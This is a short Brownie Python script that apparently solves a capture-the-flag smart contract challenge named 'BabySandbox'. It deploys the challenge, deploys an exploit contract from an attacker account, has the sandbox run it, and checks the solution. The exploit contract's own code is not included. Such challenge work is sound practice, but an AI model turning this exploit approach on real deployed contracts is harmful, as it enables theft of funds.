from brownie import (
    interface,
    BabySandboxSetup,
    BabySandbox,
    BabySandboxExploit,
)
from scripts.helpful_scripts import (
    get_account,
    check_solution,
    get_web3
)
from web3 import Web3


def main():
    deployer = get_account(index=0)
    attacker = get_account(index=1)

    # setup challenge
    setup = BabySandboxSetup.deploy({"from": deployer})
    sandbox = BabySandbox.at(setup.sandbox())

    # solve challenge
    exploit = BabySandboxExploit.deploy({"from": attacker})
    print("Selector of modifyState() [hardcoded in the exploit contract]", exploit.getSelector())
    print("Address of the exploit contract [hardcoded in the exploit contract]", exploit.address)
    print()

    tx = sandbox.run(exploit, {"from": attacker})
    tx.wait(1)

    # check the solution
    check_solution(setup)